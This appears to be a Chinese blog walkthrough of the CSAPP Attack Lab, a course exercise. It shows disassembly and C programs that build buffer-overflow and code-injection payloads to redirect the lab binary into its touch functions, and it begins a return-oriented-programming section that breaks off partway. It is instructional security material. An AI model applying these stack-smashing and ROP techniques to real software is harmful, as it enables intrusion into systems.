<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CSAPP Lab -- Attack Lab - Real Own</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Chaos Chen"><meta name="msapplication-TileImage" content="/img/f7.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Chaos Chen"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="CSAPP缓冲区溢出实验，这是x86_64版本的。"><meta property="og:type" content="blog"><meta property="og:title" content="CSAPP Lab -- Attack Lab"><meta property="og:url" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/"><meta property="og:site_name" content="Real Own"><meta property="og:description" content="CSAPP缓冲区溢出实验，这是x86_64版本的。"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210413223522894.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414195630438.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414200621659.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201125538.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201408924.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201542552.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201620604.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210527536.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210633796.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414211535348.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414220414649.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414221240024.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415170448515.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212655209.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212711141.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212728986.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000624247.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415215218990.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000504849.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416201507156.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416203857581.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416234915313.png"><meta property="og:image" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416235205795.png"><meta property="article:published_time" content="2021-04-16T16:04:15.000Z"><meta property="article:modified_time" content="2023-06-30T08:53:26.357Z"><meta property="article:author" content="Chaos Chen"><meta property="article:tag" content="CSAPP"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210413223522894.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/"},"headline":"CSAPP Lab -- Attack Lab","image":["https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210413223522894.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414195630438.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414200621659.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201125538.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201408924.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201542552.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201620604.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210527536.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210633796.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414211535348.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414220414649.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414221240024.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415170448515.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212655209.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212711141.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212728986.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000624247.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415215218990.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000504849.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416201507156.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416203857581.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416234915313.png","https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416235205795.png"],"datePublished":"2021-04-16T16:04:15.000Z","dateModified":"2023-06-30T08:53:26.357Z","author":{"@type":"Person","name":"Chaos Chen"},"publisher":{"@type":"Organization","name":"Real Own","logo":{"@type":"ImageObject","url":"https://rlyown.github.io/img/f7.png"}},"description":"CSAPP缓冲区溢出实验，这是x86_64版本的。"}</script><link rel="canonical" href="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/"><link rel="alternate" href="/atom.xml" title="Real Own" type="application/atom+xml"><link rel="icon" href="/img/f7.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/f7.png" alt="Real Own" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Rlyown/rlyown.github.io"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Publié il y a&nbsp;<time dateTime="2021-04-16T16:04:15.000Z" title="4/17/2021, 12:04:15 AM">2021-04-17</time></span><span class="level-item">Mis à jour il y a&nbsp;<time dateTime="2023-06-30T08:53:26.357Z" title="6/30/2023, 4:53:26 PM">2023-06-30</time></span><span class="level-item"><a class="link-muted" href="/categories/Operating-System/">Operating System</a></span><span class="level-item">25 minutes de lecture (Environ 3797 mots)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visites</span></div></div><h1 class="title is-3 is-size-4-mobile">CSAPP Lab -- Attack Lab</h1><div class="content"><p>出师不利啊，上来就碰到执行不了的错误。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210413223522894.png" class="">

<p>参照网上的说法执行的时候添加<code>-q</code>参数即可。</p>
<p>通过WriteUp文件可以得知，我们的目标为touchx函数。</p>
<p><strong>Tips：</strong></p>
<ul>
<li><p>这里建议使用cgdb工具（版本至少为0.7.1），从0.7.1版本开始，cgdb允许使用反汇编窗口（通过按<code>esc</code>然后输入<code>:set dis</code>启用）。</p>
</li>
<li><p>指令码我们可以通过编写汇编程序，然后使用<code>gcc -c</code>对其汇编之后，再使用<code>objdump -s -d</code>反汇编获得。</p>
</li>
</ul>
<h2 id="ctarget-–-CI"><a href="#ctarget-–-CI" class="headerlink" title="ctarget – CI"></a>ctarget – CI</h2><h3 id="Touch-1"><a href="#Touch-1" class="headerlink" title="Touch 1"></a>Touch 1</h3><p>拿到手上先执行一下这个程序，随意提供一些输入可以看到关于注入失败的提示。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414195630438.png" class="">

<p>根据提示信息尝试搜索Getbuf函数，搜索结果如下。同时也得知了getbuf仅在test中被调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 getbuf:</span><br><span class="line">  4017a8: 48 83 ec 28                  	subq	$40, %rsp</span><br><span class="line">  4017ac: 48 89 e7                     	movq	%rsp, %rdi</span><br><span class="line">  4017af: e8 8c 02 00 00               	callq	652 &lt;Gets&gt;</span><br><span class="line">  4017b4: b8 01 00 00 00               	movl	$1, %eax</span><br><span class="line">  4017b9: 48 83 c4 28                  	addq	$40, %rsp</span><br><span class="line">  4017bd: c3                           	retq</span><br><span class="line"></span><br><span class="line">0000000000401968 test:</span><br><span class="line">  401968: 48 83 ec 08                  	subq	$8, %rsp</span><br><span class="line">  40196c: b8 00 00 00 00               	movl	$0, %eax</span><br><span class="line">  401971: e8 32 fe ff ff               	callq	-462 &lt;getbuf&gt;</span><br><span class="line">  401976: 89 c2                        	movl	%eax, %edx</span><br><span class="line">  401978: be 88 31 40 00               	movl	$4206984, %esi</span><br><span class="line">  40197d: bf 01 00 00 00               	movl	$1, %edi</span><br><span class="line">  401982: b8 00 00 00 00               	movl	$0, %eax</span><br><span class="line">  401987: e8 64 f4 ff ff               	callq	-2972 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c: 48 83 c4 08                  	addq	$8, %rsp</span><br><span class="line">  401990: c3                           	retq</span><br></pre></td></tr></table></figure>

<p>然后根据WriteUp可以得知目标函数为touch1。从中可以得知，touch1仅做一次puts操作就调用校验函数。并且touch1函数不包含任何的输入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 touch1:</span><br><span class="line">  4017c0: 48 83 ec 08                  	subq	$8, %rsp</span><br><span class="line">  4017c4: c7 05 0e 2d 20 00 01 00 00 00	movl	$1, 2108686(%rip)</span><br><span class="line">  4017ce: bf c5 30 40 00               	movl	$4206789, %edi</span><br><span class="line">  4017d3: e8 e8 f4 ff ff               	callq	-2840 &lt;puts@plt&gt;</span><br><span class="line">  4017d8: bf 01 00 00 00               	movl	$1, %edi</span><br><span class="line">  4017dd: e8 ab 04 00 00               	callq	1195 &lt;validate&gt;</span><br><span class="line">  4017e2: bf 00 00 00 00               	movl	$0, %edi</span><br><span class="line">  4017e7: e8 54 f6 ff ff               	callq	-2476 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到共分配了40个字节给栈来存储输入，因此尝试输入40个字节和39个字节（由于字符串末尾存在一个<code>\0</code>，因此实际上是输入了41和40个字节）看看。发现果然输入40个字节的事后发生了溢出。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414200621659.png" class="">

<p>因此在0x4017b4地址处设置断点，仅输入39个字符（未溢出），然后查看栈情况。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201125538.png" class="">

<p>可以看到前40个字节是我们输入的数据，而之后的数据应该是getbuf函数的返回地址，这里我们打印一下看看。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201408924.png" class="">

<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201542552.png" class="">

<p>对这个地址进行反汇编，可以发现于test函数中getbuf返回的地址一致。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414201620604.png" class="">

<p>我们的目标是跳转到touch1函数（地址0x00000000004017c0），因此构造payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    fp = fopen(<span class="string">&quot;touch1.payload&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="comment">// payload</span></span><br><span class="line">    <span class="type">char</span> buf[] = &#123;</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xC0</span>, <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> r = fwrite(buf, <span class="number">48</span>, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwrite return %d\n&quot;</span>, r);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对其编译并执行得到我们需要的payload字符。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210527536.png" class="">

<p>将其提交通过！</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414210633796.png" class="">

<h3 id="Touch-2"><a href="#Touch-2" class="headerlink" title="Touch 2"></a>Touch 2</h3><p>用同样的方式进入touch2函数（地址0x00000000004017ec）看看。可以看到校验失败，说明touch2不能通过简单的跳转完成。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414211535348.png" class="">

<p>进一步分析touch2的代码。touch2对输入变量和<code>2108642(%rip)</code>的值进行比较，如果不相等则打印”Misfire…”。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec touch2:</span><br><span class="line">  4017ec: 48 83 ec 08                  	subq	$8, %rsp</span><br><span class="line">  4017f0: 89 fa                        	movl	%edi, %edx</span><br><span class="line">  4017f2: c7 05 e0 2c 20 00 02 00 00 00	movl	$2, 2108640(%rip)</span><br><span class="line">  4017fc: 3b 3d e2 2c 20 00            	cmpl	2108642(%rip), %edi</span><br><span class="line">  401802: 75 20                        	jne	32 &lt;touch2+0x38&gt;</span><br><span class="line">  401804: be e8 30 40 00               	movl	$4206824, %esi</span><br><span class="line">  401809: bf 01 00 00 00               	movl	$1, %edi</span><br><span class="line">  40180e: b8 00 00 00 00               	movl	$0, %eax</span><br><span class="line">  401813: e8 d8 f5 ff ff               	callq	-2600 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818: bf 02 00 00 00               	movl	$2, %edi</span><br><span class="line">  40181d: e8 6b 04 00 00               	callq	1131 &lt;validate&gt;</span><br><span class="line">  401822: eb 1e                        	jmp	30 &lt;touch2+0x56&gt;</span><br><span class="line">  401824: be 10 31 40 00               	movl	$4206864, %esi</span><br><span class="line">  401829: bf 01 00 00 00               	movl	$1, %edi</span><br><span class="line">  40182e: b8 00 00 00 00               	movl	$0, %eax</span><br><span class="line">  401833: e8 b8 f5 ff ff               	callq	-2632 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838: bf 02 00 00 00               	movl	$2, %edi</span><br><span class="line">  40183d: e8 0d 05 00 00               	callq	1293 &lt;fail&gt;</span><br><span class="line">  401842: bf 00 00 00 00               	movl	$0, %edi</span><br><span class="line">  401847: e8 f4 f5 ff ff               	callq	-2572 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p><code>2108642(%rip)</code>的值是一个不可访问的内存，但是根据gdb给出的信息来看，它应该是cookie的值。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414220414649.png" class="">

<p>首先做一个trick试试，将返回地址设为0x0000000000401804，即直接跳过判断语句。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210414221240024.png" class="">

<p>依然校验失败，说明不能这么做，只能老老实实的想办法修改touch2的输入参数，将其修改为Cookie（0x59b997fa，别想着修改cookie文件，这个是没有用的）。</p>
<p>在调用getbuf时，rsp寄存器的值为0x5561dc78，并且rsp可以存储40个字节，因此可以想办法通过这里来注入自己的代码。</p>
<blockquote>
<p>另外，Gets函数体内有一个save_char函数会将输入的字符放入到一个数组中。这个机制也可以利用，但是相比之下更为复杂。</p>
</blockquote>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415170448515.png" class="">

<p>要修改目标地址的值，那么就要设计指令<code>movq $0x59b997fa, %rdi</code>。因此构造payload.c如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// movq  $0x59b997fa, %rdi</span></span><br><span class="line"><span class="comment">// pushq 0x4017EC</span></span><br><span class="line"><span class="comment">// ret</span></span><br><span class="line"><span class="type">char</span> buf[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0xFA</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0xEC</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xC3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0xdc</span>, <span class="number">0x61</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里方法不唯一，但是存在一个问题。经测试，如果采用继续覆盖的方式将第二个跳转地址写入栈，这个会引发segment fault错误；此外采用mov指令直接修改(%rsp)的值，再跳转也会引发segment fault错误。仅使用push的方式不会引发。猜测是由于上述的两类方式不符合栈的使用规则，从而导致的问题。</p>
</blockquote>
<p>这里简单解释一个原因，首先我们使用了缓冲区溢出，覆盖了getbuf的返回地址，将其指向我们设计的指令的地址，然后再通过我们的指令修改rdi寄存器的值，并通过ret跳转到touch2函数。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212655209.png" class="">

<p>getbuf执行完ret之后，跳转到了我们写入字节的起始位置，然后将目标地址压栈，并通过ret语句跳转到touch2函数。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212711141.png" class="">

<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415212728986.png" class="">

<p>将其提交，最后成功通过！</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000624247.png" class="">

<h3 id="Touch-3"><a href="#Touch-3" class="headerlink" title="Touch 3"></a>Touch 3</h3><p>先来观察一下touch3的要求，（这里使用的ida工具进行的反汇编）。可以看到它是将输入的字节与cookie一起送入一个hexmatch的函数进行比较。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210415215218990.png" class="">

<p>然后进一步查看hexmatch函数的内容，大致可以猜测其检查输入的16进制字符串是否与一个16进制数匹配。</p>
<p>因此构造payload，大致意思就是将一个字符串写入栈中，然后将该字符串的地址传给rdi寄存器。我们把字符串放在0x5561dc78的位置，并在栈中添加至少预留48个字节的空间来避免字符串被覆盖。</p>
<blockquote>
<p>由于getbuf最后会给rsp增加40字节，并且之后执行ret指令将返回地址出栈。（相当于共执行pop 6次）。这就导致写入的字符串会位于未被分配的空间，从而造成字符串的覆盖。</p>
<p>此外还需要考虑栈对齐的问题，即使我们把字符串写在了返回地址之后，让它所在的空间不是未分配空间。但是如果栈指针不16字节对齐，sprintf函数会检查栈的对齐问题，从而导致出错。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mov   $0x5561dc78, %rdi</span></span><br><span class="line"><span class="comment">// subq  $48, %rsp</span></span><br><span class="line"><span class="comment">// pushq $0x4018FA</span></span><br><span class="line"><span class="comment">// ret</span></span><br><span class="line"><span class="type">char</span> buf[] = &#123;</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x78</span>, <span class="number">0xDC</span>, <span class="number">0x61</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, </span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x30</span>, <span class="number">0x68</span>, <span class="number">0xFA</span>, <span class="number">0x18</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0xDC</span>, <span class="number">0x61</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416000504849.png" class="">

<h2 id="rtarget-–-ROP"><a href="#rtarget-–-ROP" class="headerlink" title="rtarget – ROP"></a>rtarget – ROP</h2><p>这里因为明确说了，使用ROP攻击，而不是代码注入。因此我们的攻击代码为在程序中精心挑选的指令来实施攻击。这部分的实验，提供了一个精简的指令组farm.c，里面都是很简单的函数来供我们选择。</p>
<p>由于ROP攻击方式是可以绕过<strong>NX&#x2F;DEP</strong>（内存区域不可执行）和<strong>ASLR</strong>（栈地址随机化）防护的，因此我们下面的实验也假设程序是设置过上述防护的。</p>
<h3 id="Touch-1-1"><a href="#Touch-1-1" class="headerlink" title="Touch 1"></a>Touch 1</h3><p>这个与ctarget的touch 1完全一致，因此不考虑。</p>
<h3 id="Touch-2-1"><a href="#Touch-2-1" class="headerlink" title="Touch 2"></a>Touch 2</h3><p>touch2的函数与ctarget一致。因此我们同样需要想办法修改rdi寄存器来让它与cookie的值相等。</p>
<p>因为farm提供函数均为操作rdi或者rax寄存器。farm函数只提供了对<code>(%rdi)</code>的操作，而没有提供我们需要的直接修改rdi寄存器值的指令。</p>
